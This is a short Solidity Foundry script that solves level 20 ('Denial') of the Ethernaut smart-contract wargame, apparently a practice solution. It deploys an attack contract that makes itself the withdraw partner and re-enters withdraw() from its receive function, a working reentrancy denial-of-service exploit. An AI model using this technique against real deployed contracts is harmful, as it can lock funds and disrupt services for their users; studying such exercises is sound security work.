// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/20_Denial.sol";

contract ExploitScript is Script {

    function run() external {
        vm.startBroadcast();
        DenialAttack denialAttack = new DenialAttack();
        denialAttack.attack();
        vm.stopBroadcast();
    }
}

contract DenialAttack {
    Denial level20 = Denial(payable(your_challenge_address));

    function attack() public {
        level20.setWithdrawPartner(address(this));
    }

    receive() external payable {
        level20.withdraw();
    }
}
